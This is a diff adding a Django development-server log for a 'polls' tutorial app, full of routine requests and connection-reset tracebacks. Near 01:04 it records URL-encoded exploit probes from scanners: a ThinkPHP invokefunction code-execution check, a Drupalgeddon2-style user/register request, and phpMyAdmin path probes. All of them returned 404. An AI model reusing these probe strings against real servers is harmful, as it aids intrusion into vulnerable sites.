@@ -1,0 +1,1390 @@
+[09/Feb/2020 00:03:46] "GET /polls/ HTTP/1.1" 200 21
+[09/Feb/2020 00:03:52] "GET /polls/1/ HTTP/1.1" 200 342
+[09/Feb/2020 00:03:56] "GET /polls/2/ HTTP/1.1" 404 179
+[09/Feb/2020 00:04:01] "GET /polls/3 HTTP/1.1" 301 0
+[09/Feb/2020 00:04:01] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:05:54] "GET /polls/ HTTP/1.1" 200 21
+[09/Feb/2020 00:06:03] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:06:11] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 00:06:11] "GET /polls/3/results/ HTTP/1.1" 200 216
+[09/Feb/2020 00:06:16] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:06:19] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 00:06:19] "GET /polls/3/results/ HTTP/1.1" 200 217
+[09/Feb/2020 00:09:09] "GET /polls/3 HTTP/1.1" 301 0
+[09/Feb/2020 00:09:09] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:09:17] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:09:17] "GET /favicon.ico HTTP/1.1" 404 179
+[09/Feb/2020 00:09:49] "GET /polls/ HTTP/1.1" 200 21
+[09/Feb/2020 00:09:50] "GET /admin/ HTTP/1.1" 200 5934
+[09/Feb/2020 00:09:50] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:09:50] "GET /static/admin/css/dashboard.css HTTP/1.1" 404 179
+[09/Feb/2020 00:09:50] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+[09/Feb/2020 00:09:53] "GET /admin/ HTTP/1.1" 200 5934
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16694)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 00:10:08] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 00:10:08] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1917
+[09/Feb/2020 00:10:08] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+[09/Feb/2020 00:10:08] "GET /static/admin/css/login.css HTTP/1.1" 404 179
+[09/Feb/2020 00:10:08] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:10:08] "GET /favicon.ico HTTP/1.1" 404 179
+[09/Feb/2020 00:10:09] "GET /polls/3 HTTP/1.1" 301 0
+[09/Feb/2020 00:10:12] "GET / HTTP/1.1" 404 179
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16806)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16805)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16815)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16817)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16816)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 00:12:14] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:12:15] "GET /favicon.ico HTTP/1.1" 404 179
+[09/Feb/2020 00:12:16] "GET /polls/3 HTTP/1.1" 301 0
+[09/Feb/2020 00:12:19] "GET / HTTP/1.1" 404 179
+[09/Feb/2020 00:12:19] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:12:19] "GET /polls/3 HTTP/1.1" 301 0
+[09/Feb/2020 00:12:19] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 00:12:22] "GET / HTTP/1.1" 404 179
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16469)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 00:12:35] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 00:12:35] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1917
+[09/Feb/2020 00:12:35] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:12:35] "GET /static/admin/css/login.css HTTP/1.1" 404 179
+[09/Feb/2020 00:12:35] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+[09/Feb/2020 00:12:35] "GET /admin/login/?next=/admin HTTP/1.1" 200 1915
+[09/Feb/2020 00:12:36] "GET /favicon.ico HTTP/1.1" 404 179
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16520)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16523)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16521)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('111.35.58.126', 16522)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 00:13:28] "GET /admin HTTP/1.1" 301 0
+[09/Feb/2020 00:13:33] "GET /admin HTTP/1.1" 301 0
+[09/Feb/2020 00:13:33] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 00:13:33] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1917
+[09/Feb/2020 00:13:33] "GET /static/admin/css/login.css HTTP/1.1" 404 179
+[09/Feb/2020 00:13:33] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+[09/Feb/2020 00:13:34] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:13:35] "GET /admin/login/?next=/admin HTTP/1.1" 200 1915
+[09/Feb/2020 00:13:42] "GET /admin/login/?next=/admin HTTP/1.1" 200 1915
+[09/Feb/2020 00:13:42] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:13:42] "GET /static/admin/css/login.css HTTP/1.1" 404 179
+[09/Feb/2020 00:13:42] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+Performing system checks...
+
+System check identified no issues (0 silenced).
+February 09, 2020 - 00:03:40
+Django version 3.0.3, using settings 'my_try.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+[09/Feb/2020 00:16:59] "GET /admin/ HTTP/1.1" 200 5901
+[09/Feb/2020 00:16:59] "GET /static/admin/css/dashboard.css HTTP/1.1" 404 179
+[09/Feb/2020 00:16:59] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:16:59] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+[09/Feb/2020 00:17:11] "GET /static/admin/css/base.css HTTP/1.1" 404 179
+[09/Feb/2020 00:17:11] "GET /static/admin/css/dashboard.css HTTP/1.1" 404 179
+[09/Feb/2020 00:17:11] "GET /static/admin/css/responsive.css HTTP/1.1" 404 179
+Performing system checks...
+
+System check identified no issues (0 silenced).
+February 09, 2020 - 00:16:34
+Django version 3.0.3, using settings 'my_try.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[09/Feb/2020 00:17:57] "GET /admin/ HTTP/1.1" 200 5901
+[09/Feb/2020 00:17:57] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[09/Feb/2020 00:17:57] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[09/Feb/2020 00:17:57] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18052
+[09/Feb/2020 00:17:57] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[09/Feb/2020 00:17:58] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[09/Feb/2020 00:17:58] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[09/Feb/2020 00:17:58] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 304 0
+[09/Feb/2020 00:17:58] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[09/Feb/2020 00:17:58] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[09/Feb/2020 00:17:58] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[09/Feb/2020 00:18:03] "GET /admin/ HTTP/1.1" 200 5901
+/root/my_try/polls/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+February 09, 2020 - 00:17:37
+Django version 3.0.3, using settings 'my_try.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[09/Feb/2020 00:19:08] "GET /polls/ HTTP/1.1" 200 21
+/root/my_try/polls/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+February 09, 2020 - 00:19:00
+Django version 3.0.3, using settings 'my_try.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[09/Feb/2020 00:21:41] "GET /polls/ HTTP/1.1" 200 197
+[09/Feb/2020 00:22:30] "GET /polls/3/ HTTP/1.1" 200 582
+Not Found: /favicon.ico
+[09/Feb/2020 00:22:30] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 00:22:33] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 00:22:33] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1915
+[09/Feb/2020 00:22:33] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[09/Feb/2020 00:22:33] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[09/Feb/2020 00:22:33] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18052
+[09/Feb/2020 00:22:34] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[09/Feb/2020 00:22:34] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[09/Feb/2020 00:22:34] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+Not Found: /favicon.ico
+[09/Feb/2020 00:22:34] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 00:23:37] "GET /polls HTTP/1.1" 301 0
+[09/Feb/2020 00:23:37] "GET /polls/ HTTP/1.1" 200 197
+[09/Feb/2020 00:23:45] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 00:23:46] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 00:23:51] "GET /polls/1/ HTTP/1.1" 200 342
+[09/Feb/2020 00:23:51] "GET /polls/1 HTTP/1.1" 301 0
+[09/Feb/2020 00:23:51] "GET /polls/1/ HTTP/1.1" 200 342
+[09/Feb/2020 00:23:55] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 00:23:55] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 00:24:07] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 00:24:07] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 00:24:10] "GET /polls/3/ HTTP/1.1" 200 582
+Not Found: /favicon.ico
+[09/Feb/2020 00:24:10] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 00:24:11] "GET /polls HTTP/1.1" 301 0
+[09/Feb/2020 00:24:11] "GET /polls/ HTTP/1.1" 200 197
+[09/Feb/2020 00:24:14] "GET /polls/3/ HTTP/1.1" 200 582
+Not Found: /favicon.ico
+[09/Feb/2020 00:24:15] "GET /favicon.ico HTTP/1.1" 404 2078
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8946)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8945)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 00:24:37] "GET /polls HTTP/1.1" 301 0
+[09/Feb/2020 00:24:51] "GET /polls/1 HTTP/1.1" 301 0
+[09/Feb/2020 00:24:53] "GET /polls/1 HTTP/1.1" 301 0
+[09/Feb/2020 00:24:53] "GET /polls/1/ HTTP/1.1" 200 342
+[09/Feb/2020 00:34:15] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 00:34:15] "GET /favicon.ico HTTP/1.1" 404 2078
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8947)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 00:58:26] "GET /polls/3/ HTTP/1.1" 200 582
+----------------------------------------
+Exception happened during processing of request from ('49.232.128.185', 46903)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /index.php
+[09/Feb/2020 01:04:50] "GET /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 404 2319
+Not Found: /user/register
+[09/Feb/2020 01:05:07] "POST /%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78 HTTP/1.1" 404 2322
+Not Found: /mysql_admin/index.php
+[09/Feb/2020 01:05:24] "GET /mysql_admin/index.php HTTP/1.1" 404 2108
+Not Found: /phpmadmin/index.php
+[09/Feb/2020 01:05:25] "GET /phpmadmin/index.php HTTP/1.1" 404 2102
+[09/Feb/2020 01:07:39] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 01:07:39] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 01:07:41] "GET /polls/3/ HTTP/1.1" 200 582
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8950)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8951)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8954)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 8956)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[09/Feb/2020 02:33:19] "GET / HTTP/1.1" 404 2027
+----------------------------------------
+Exception happened during processing of request from ('63.143.35.226', 62224)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
